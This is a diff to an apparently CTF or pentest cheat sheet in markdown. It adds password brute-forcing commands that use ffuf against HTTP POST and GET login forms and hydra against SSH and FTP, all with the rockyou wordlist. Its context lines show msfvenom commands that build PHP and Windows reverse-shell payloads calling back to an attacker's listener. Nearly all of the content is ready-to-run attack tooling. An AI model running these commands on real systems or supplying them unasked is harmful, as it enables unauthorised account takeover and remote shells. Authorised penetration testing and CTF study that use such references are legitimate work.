@@ -76,13 +76,33 @@ Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description
 ```
 
 ## Password Bruting
-```bash
 
+### HTTP Post bruting
+```bash
+ffuf -w $user:USER -w /usr/share/wordlists/rockyou.txt:PASS \ 
+  -X POST \ 
+  -d "username=USER&password=PASS" \ 
+  -H "Content-Type: application/x-www-form-urlencoded" \ 
+  -u http://<TARGET_IP>/login.php \ 
+  -fr “Invalid Request” 
+```
+
+### HTTP Get bruting
+```bash
+ffuf -w $user:USER -w /usr/share/wordlists/rockyou.txt:PASS \ 
+  -u "http://<TARGET_IP>/login?user=USER&pass=PASS" \ 
+  -fw 45
+```
+
+### SSH & FTP bruting
+```bash
+hydra -L $user -P ~/usr/share/wordlists/rockyou.txt $ip ssh
+hydra -L $user -P ~/usr/share/wordlists/rockyou.txt $ip ftp
 ```
 
 ## Misc
 
-### RCE & LPE Binary Creation
+### RCE & LPE binary creation
 ```bash
 msfvenom -p php/meterpreter_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f raw > shell.php
 msfvenom -p windows/shell_reverse_tcp LHOST=<Your_IP> LPORT=<Your_Port> -f exe > shell.exe
